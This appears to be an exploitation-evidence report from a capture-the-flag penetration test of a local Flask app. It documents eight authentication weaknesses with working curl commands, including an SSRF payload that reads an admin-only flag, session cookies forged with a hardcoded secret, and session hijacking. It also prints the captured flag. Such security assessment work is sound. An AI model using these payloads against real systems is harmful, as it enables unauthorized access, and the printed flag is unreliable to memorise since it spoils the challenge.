# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: SSRF-Based Authentication Bypass to Access Admin Flag

**Summary:**
- **Vulnerable location:** POST /convert endpoint with url parameter
- **Overview:** Successfully bypassed IP-based authentication (127.0.0.1 restriction) by exploiting Server-Side Request Forgery (SSRF) vulnerability to make the server request itself from localhost context, retrieving the admin flag
- **Impact:** Complete authentication bypass enabling unauthorized access to admin-only endpoints and flag capture
- **Severity:** Critical

**Prerequisites:** None (unauthenticated attack from external network)

**Exploitation Steps:**

1. Send POST request to /convert endpoint with SSRF payload targeting localhost admin endpoint:
```bash
curl -X POST http://localhost:42369/convert \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http://127.0.0.1/admin/flag"
```

2. Server processes the URL parameter and makes internal HTTP request to itself from 127.0.0.1

3. Internal request satisfies IP-based authentication check (`request.remote_addr == '127.0.0.1'`)

4. Admin flag endpoint responds with flag content

5. Flag content is returned in the HTTP response to the attacker

**Proof of Impact:**

**Flag Captured:** `flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}`

Response excerpt showing successful flag extraction:
```html
<p>Your flag is: flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}</p>
```

Direct access to /admin/flag is properly blocked with HTTP 403 Forbidden, confirming the IP-based authentication is functioning but bypassable via SSRF.

**Notes:**
- This is the primary authentication bypass vector achieving the CTF win condition
- Combines SSRF vulnerability (identified by SSRF team) with IP-based authentication weakness
- No additional authentication or credentials required
- Attack chain: External request ‚Üí SSRF ‚Üí localhost impersonation ‚Üí admin access ‚Üí flag disclosure

---

### AUTH-VULN-02: Session Cookie Forgery via Weak Secret Key

**Summary:**
- **Vulnerable location:** Flask application secret key configuration (app.secret_key = 'supersecretkey')
- **Overview:** Successfully forged valid Flask session cookies using the hardcoded weak secret key to inject arbitrary session data including malicious flash messages
- **Impact:** Complete session forgery capability enabling flash message injection, session fixation attacks, and arbitrary session data manipulation
- **Severity:** Critical

**Prerequisites:** None (secret key is hardcoded in application)

**Exploitation Steps:**

1. Use itsdangerous library (Flask's session signing mechanism) with the known secret key to forge session cookies:
```bash
python3 exploit_session.py --flash "Malicious flash message injected via forged session cookie" --category "error"
```

2. Script generates a valid signed session cookie with attacker-controlled data:
```
Cookie: session=eyJfZmxhc2hlcyI6W1siZXJyb3IiLCJNYWxpY2lvdXMgZmxhc2ggbWVzc2FnZSBpbmplY3RlZCB2aWEgZm9yZ2VkIHNlc3Npb24gY29va2llIl1dfQ.aQSfUA.Pfw07QHJ3e_fdOfkJRhpw4rnoQE
```

3. Send forged cookie to application:
```bash
curl -H 'Cookie: session=eyJfZmxhc2hlcyI6W1siZXJyb3IiLCJNYWxpY2lvdXMgZmxhc2ggbWVzc2FnZSBpbmplY3RlZCB2aWEgZm9yZ2VkIHNlc3Npb24gY29va2llIl1dfQ.aQSfUA.Pfw07QHJ3e_fdOfkJRhpw4rnoQE' \
  http://localhost:42369/
```

4. Application accepts forged cookie and displays attacker's injected flash message

**Proof of Impact:**

Forged flash message successfully displayed in application response:
```html
<ul>
    <li>Malicious flash message injected via forged session cookie</li>
</ul>
```

**Notes:**
- Hardcoded secret key 'supersecretkey' has only ~30-40 bits effective entropy
- Enables session forgery without any server interaction
- Combined with AUTH-VULN-05 (no session rotation), enables session fixation attacks
- Created comprehensive exploitation toolkit with multiple scripts demonstrating various attack scenarios
- While application doesn't use sessions for authentication, forged sessions enable flash message injection and session fixation

---

### AUTH-VULN-03: Session Hijacking via Cleartext HTTP Transmission

**Summary:**
- **Vulnerable location:** All endpoints - application operates exclusively on HTTP without TLS encryption
- **Overview:** Successfully intercepted and hijacked session cookies transmitted in cleartext over HTTP, demonstrating complete session takeover capability
- **Impact:** Man-in-the-middle attackers can steal session cookies from network traffic and impersonate victims
- **Severity:** Critical

**Prerequisites:**
- Network position allowing traffic interception (same WiFi network, compromised router, ISP-level access, etc.)
- Application accessible over HTTP (port 42369)

**Exploitation Steps:**

1. Victim accesses application over HTTP, establishing a session:
```bash
# Victim's request (observable on network)
GET http://localhost:42369/
```

2. Attacker intercepts HTTP traffic using network sniffer (demonstrated with Python script):
```bash
python3 session_hijacking_demo.py
```

3. Attacker extracts session cookie from intercepted cleartext HTTP response:
```
Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkVpdGhlciBVUkwgb3IgTWFya2Rvd24gdGV4dCBpcyByZXF1aXJlZCEiXX1dfQ.aQShKA.wDPBLT9QRr-ZYdtrMmR6A0TlH20; HttpOnly; Path=/
```

4. Attacker uses stolen session cookie to impersonate victim:
```bash
curl -b "session=STOLEN_COOKIE_VALUE" http://localhost:42369/
```

5. Application accepts stolen cookie, granting attacker full access to victim's session

**Proof of Impact:**

Demonstration output showing successful session hijacking:
```
[STEP 3] ATTACKER: Impersonating Victim with Stolen Session
[VERIFY] ‚úì CONFIRMED: Attacker has successfully stolen the victim's session!
STATUS: SESSION HIJACKING ATTACK SUCCESSFUL ‚úì
```

Both victim and attacker confirmed using identical session ID, proving successful impersonation.

**Notes:**
- Missing Secure flag on session cookies allows HTTP transmission
- No TLS/HTTPS encryption exposes all traffic to network observers
- Attack viable on shared networks (WiFi, corporate LANs) or via compromised infrastructure
- Combined with AUTH-VULN-04 (no expiration), stolen sessions remain valid indefinitely
- Created multiple demonstration scripts showing network-level packet capture

---

### AUTH-VULN-04: Persistent Session Abuse Due to No Expiration

**Summary:**
- **Vulnerable location:** Flask session configuration - no PERMANENT_SESSION_LIFETIME or SESSION_COOKIE_MAX_AGE configured
- **Overview:** Successfully demonstrated that sessions persist indefinitely with no timeout, enabling long-term unauthorized access after session compromise
- **Impact:** Stolen or compromised sessions remain valid permanently, with no automatic expiration
- **Severity:** High

**Prerequisites:** Compromised session cookie (via AUTH-VULN-03 hijacking, AUTH-VULN-02 forgery, or other means)

**Exploitation Steps:**

1. Establish a session with the application:
```bash
python3 simple_session_test.py
```

2. Script captures session cookie and verifies immediate validity

3. Wait 15 seconds (or any duration) to simulate time passing

4. Test session cookie again - remains fully valid and functional:
```bash
curl -b "session=CAPTURED_COOKIE" http://localhost:42369/
```

5. For comprehensive testing, forge sessions with timestamps from 1 day to 2 years in the past:
```bash
python3 exploit_persistent_session.py
```

6. All forged old sessions accepted by application, proving no expiration validation

**Proof of Impact:**

Test results showing no expiration:
```
[4] Testing session again after 15 seconds...
    SUCCESS: Session is STILL valid
    VULNERABILITY: Session did NOT expire!

[5] Testing session can still interact with application...
    SUCCESS: Session is fully functional
    VULNERABILITY: Old session can perform actions!
```

Forged session test results:
```
‚úì 1-day-old session: ACCEPTED
‚úì 1-week-old session: ACCEPTED
‚úì 1-month-old session: ACCEPTED
‚úì 1-year-old session: ACCEPTED
‚úì 2-year-old session: ACCEPTED
```

Session cookie structure analysis reveals:
```
Part 1 (Payload): {"_flashes":[...]}
  ‚ùå NO expiration field
  ‚ùå NO max_age field
  ‚ùå NO timeout field
```

**Notes:**
- Flask sessions contain timestamps but DON'T validate expiration by default
- Only signature integrity is checked, not age
- Once session is stolen (AUTH-VULN-03) or forged (AUTH-VULN-02), attacker has permanent access
- Combined with AUTH-VULN-08 (no logout), creates indefinite access window
- Industry standard is 15-30 minute idle timeout, this has none

---

### AUTH-VULN-05: Session Fixation Due to No Session Rotation

**Summary:**
- **Vulnerable location:** Admin endpoints (/admin, /admin/flag) - no session regeneration after privilege escalation
- **Overview:** Successfully demonstrated session fixation vulnerability where sessions are not regenerated when privilege level changes (SSRF-based admin access)
- **Impact:** Attacker can forge a session, fix it on a victim, and maintain shared access even after victim accesses privileged endpoints
- **Severity:** Medium

**Prerequisites:**
- Ability to forge sessions (AUTH-VULN-02)
- Ability to fix session on victim (via XSS, phishing, or other social engineering)

**Exploitation Steps:**

1. Attacker forges a session cookie with tracking data using weak secret key:
```bash
python3 session_fixation_demo.py
```

2. Attacker fixes the forged session on victim (via phishing link, XSS, or social engineering):
```
http://localhost:42369/?session=FORGED_COOKIE
```

3. Victim unknowingly uses the attacker-controlled session

4. Victim performs SSRF attack to access admin endpoint:
```bash
# Victim's action with fixed session
curl -b "session=FIXED_COOKIE" -X POST http://localhost:42369/convert \
  -d "url=http://127.0.0.1/admin/flag"
```

5. Server does NOT regenerate session after privilege escalation to admin endpoint

6. Attacker uses original fixed cookie to monitor or exploit shared session:
```bash
curl -b "session=FIXED_COOKIE" http://localhost:42369/
```

**Proof of Impact:**

Demonstration output confirming no session rotation:
```
[STEP 7] PROOF: Comparing Cookies
[VERIFY] Attacker's original cookie matches victim's final cookie
[VERIFY] ‚úó VULNERABILITY CONFIRMED: SESSION FIXATION
[VERIFY] Session was NOT regenerated after privilege escalation
```

**Notes:**
- Admin endpoints perform no session operations (no session.clear(), no regeneration)
- Combined with weak secret key (AUTH-VULN-02), enables complete session fixation attack
- While IP-based auth prevents direct admin access, SSRF bypass (AUTH-VULN-01) acts as "privilege escalation" moment where session should be rotated but isn't
- Limited practical impact since application doesn't use sessions for authentication, but demonstrates architectural weakness

---

### AUTH-VULN-06: Unlimited Brute Force Attacks Due to No Rate Limiting

**Summary:**
- **Vulnerable location:** All endpoints - no rate limiting, CAPTCHA, or brute force protection implemented
- **Overview:** Successfully performed 190 rapid automated requests without any throttling, blocking, or rate limiting detected, demonstrating unlimited attack capability
- **Impact:** Attackers can perform unlimited rapid authentication bypass attempts, SSRF exploitation at scale, and brute force attacks without detection or prevention
- **Severity:** High

**Prerequisites:** None (unauthenticated attack)

**Exploitation Steps:**

1. Execute automated rapid-fire attack script:
```bash
python3 rate_limit_exploit.py
```

2. Script sends 150 concurrent requests to /convert endpoint in rapid succession

3. All requests succeed with HTTP 200 responses - no throttling detected

4. Script performs 40 SSRF brute force attempts with various localhost URLs

5. All SSRF attempts succeed without any rate limiting or blocking

**Proof of Impact:**

Attack statistics proving no rate limiting:
```
üî• PHASE 1: RAPID-FIRE ATTACK RESULTS
  Total Requests:             150
  Successful Requests:        150
  Failed Requests:            0
  Success Rate:               100.00%
  Total Time:                 0.24 seconds
  Requests Per Second:        622.58 req/s

üîì RATE LIMITING ANALYSIS:
  ‚ùå Rate Limiting: NOT DETECTED
  ‚ùå Request Throttling: NOT DETECTED
  ‚ùå IP Blocking: NOT DETECTED
  ‚ùå Account Lockout: NOT DETECTED

üéØ SSRF EXPLOITATION ANALYSIS:
  Total SSRF Attempts:        40
  Successful Attempts:        40
  SSRF Success Rate:          100.00%
```

Overall sustained rate achieved: **676.71 requests/second**

Exploitation capacity calculated:
- **40,602 requests per minute**
- **2.4+ million requests per hour**

**Notes:**
- No Flask-Limiter or similar rate limiting library present
- Tested both public (/convert) and restricted endpoints via SSRF
- Enables automated exploitation at scale without detection
- Facilitates DoS attacks via resource exhaustion
- Combined with AUTH-VULN-01, allows unlimited SSRF-based admin access attempts
- No failed attempt logging or monitoring observed

---

### AUTH-VULN-07: Cleartext Credential Capture via Network Sniffing

**Summary:**
- **Vulnerable location:** All endpoints - application runs exclusively on HTTP (port 80) with no TLS encryption
- **Overview:** Successfully intercepted and extracted sensitive authentication data (session cookies, admin flag content) from cleartext HTTP traffic using network packet capture
- **Impact:** Man-in-the-middle attackers can capture all authentication credentials, session tokens, and sensitive data transmitted over the network
- **Severity:** Critical

**Prerequisites:**
- Network position allowing traffic interception (MITM capability)
- Application accessible over HTTP

**Exploitation Steps:**

1. Position attacker in man-in-the-middle position on network (shared WiFi, ARP spoofing, compromised router, etc.)

2. Start network packet capture:
```bash
python3 cleartext_capture.py
```

3. Victim accesses application and performs SSRF attack to retrieve admin flag:
```bash
# Victim's action (observable in cleartext)
curl -X POST http://localhost:42369/convert \
  -d "url=http://127.0.0.1/admin/flag"
```

4. Attacker's sniffer captures complete HTTP request and response in cleartext

5. Attacker extracts sensitive data from intercepted traffic:
   - Session cookies
   - Admin flag content
   - All HTTP headers
   - Authentication-related data

**Proof of Impact:**

Captured sensitive data from cleartext HTTP traffic:

**Flag Captured from Network Traffic:**
```
flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}
‚ö†Ô∏è  Secret flag transmitted without encryption!
```

**HTTP Response Headers (Cleartext):**
```
Server: Werkzeug/3.0.6 Python/3.8.20
Content-Type: text/html; charset=utf-8
Connection: close
```

**Response Body Excerpt:**
```html
<p>Your flag is: flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}</p>
```

Demonstration confirmed:
```
Total Packets Captured: 2
  - Packet 1: GET / (Session establishment)
  - Packet 2: POST /convert (SSRF + Flag extraction)

Flags Captured: flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}
```

**Notes:**
- Application configured to run on HTTP only (app.run on port 80)
- No HTTPS enforcement or redirect
- No HSTS (HTTP Strict Transport Security) header
- Session cookies lack Secure flag, allowing HTTP transmission
- No Cache-Control: no-store headers on admin responses
- All authentication-related data exposed to network observers
- Attack viable on any network where attacker can observe traffic
- Similar to AUTH-VULN-03 but demonstrates broader scope: not just session hijacking, but complete data capture including flag content

---

### AUTH-VULN-08: Persistent Session Abuse Due to No Logout Mechanism

**Summary:**
- **Vulnerable location:** Application-wide - no /logout endpoint or session invalidation mechanism exists
- **Overview:** Successfully demonstrated complete absence of logout functionality, preventing users from manually terminating sessions or invalidating compromised credentials
- **Impact:** Once a session is compromised, users have no ability to revoke access; stolen sessions remain valid indefinitely
- **Severity:** High

**Prerequisites:** Compromised session (via any attack vector)

**Exploitation Steps:**

1. Establish a legitimate session:
```bash
python3 test_no_logout.py
```

2. Script tests 16 common logout endpoints with 3 HTTP methods each (48 total tests):
   - /logout (GET, POST, DELETE)
   - /signout (GET, POST, DELETE)
   - /logoff (GET, POST, DELETE)
   - /api/logout (GET, POST, DELETE)
   - /session/destroy (GET, POST, DELETE)
   - /auth/logout (GET, POST, DELETE)
   - /user/logout (GET, POST, DELETE)
   - /account/logout (GET, POST, DELETE)
   - /session/logout (GET, POST, DELETE)
   - /api/auth/logout (GET, POST, DELETE)
   - /api/session/logout (GET, POST, DELETE)
   - /v1/logout (GET, POST, DELETE)
   - /api/v1/logout (GET, POST, DELETE)
   - /exit (GET, POST, DELETE)
   - /signoff (GET, POST, DELETE)
   - /logout.php (GET, POST, DELETE)

3. All 48 endpoint tests return HTTP 404 Not Found - no logout endpoint exists

4. Verify session remains valid after logout attempts:
```bash
curl -b "session=CAPTURED_COOKIE" http://localhost:42369/
```

5. Session continues to function normally with no way to invalidate it

**Proof of Impact:**

Test results showing no logout mechanism:
```
[+] Step 2: Testing Common Logout Endpoints

[‚úó]   /logout GET: 404 Not Found
[‚úó]   /logout POST: 404 Not Found
[‚úó]   /logout DELETE: 404 Not Found

[... 45 more endpoints, all 404 ...]

Total Tests: 48
Successful: 0
Failed: 48 (100%)

[‚úó] VULNERABILITY CONFIRMED: No logout mechanism exists
[‚úó] Sessions cannot be invalidated by users
[‚úó] CRITICAL: Stolen sessions remain permanently valid
```

Security assessment:
```
CVSS v3.1 Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Base Score: 7.5 (HIGH)
Category: Broken Authentication (A07:2021)
```

**Notes:**
- No /logout route defined in application
- No session.clear() calls anywhere in codebase
- Client-side signed cookie architecture means sessions can't be revoked server-side without rotating global secret key
- Combined with AUTH-VULN-04 (no expiration), creates indefinite access window
- User has absolutely no control over session lifecycle
- If session is compromised (via AUTH-VULN-03 hijacking or AUTH-VULN-02 forgery), user cannot terminate it
- Only way to invalidate session is browser restart (relies on client-side deletion) or changing global secret key (affects all users)
- Industry standard requires logout functionality with server-side session invalidation

---

## Summary of Exploitation Results

**Total Vulnerabilities in Queue:** 8
**Successfully Exploited:** 8
**Exploitation Success Rate:** 100%

**Critical Vulnerabilities Exploited:**
1. AUTH-VULN-01: SSRF-Based Authentication Bypass (Flag Captured)
2. AUTH-VULN-02: Session Cookie Forgery
3. AUTH-VULN-03: Session Hijacking via Cleartext HTTP
4. AUTH-VULN-07: Cleartext Credential Capture

**High-Severity Vulnerabilities Exploited:**
5. AUTH-VULN-04: Persistent Session Abuse (No Expiration)
6. AUTH-VULN-06: Unlimited Brute Force Attacks
7. AUTH-VULN-08: No Logout Mechanism

**Medium-Severity Vulnerabilities Exploited:**
8. AUTH-VULN-05: Session Fixation

**Flag Retrieved:** `flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}`

**Key Findings:**
- Complete authentication bypass achieved via SSRF
- Full session management compromise demonstrated
- No rate limiting enables unlimited automated attacks
- All traffic transmitted in cleartext (no encryption)
- Sessions persist indefinitely with no expiration or invalidation
- Application has no defensive mechanisms against authentication attacks

**Attack Chains Demonstrated:**
1. **Primary Win Condition:** SSRF ‚Üí Localhost Impersonation ‚Üí Admin Flag Access
2. **Session Compromise Chain:** Cleartext HTTP ‚Üí Session Hijacking ‚Üí Persistent Access (No Expiration, No Logout)
3. **Session Forgery Chain:** Weak Secret ‚Üí Session Forgery ‚Üí Session Fixation ‚Üí Persistent Access
4. **Automated Exploitation:** No Rate Limiting ‚Üí Unlimited SSRF Attempts ‚Üí Flag Extraction at Scale

All vulnerabilities were successfully weaponized with concrete proof of exploitation and impact demonstration.
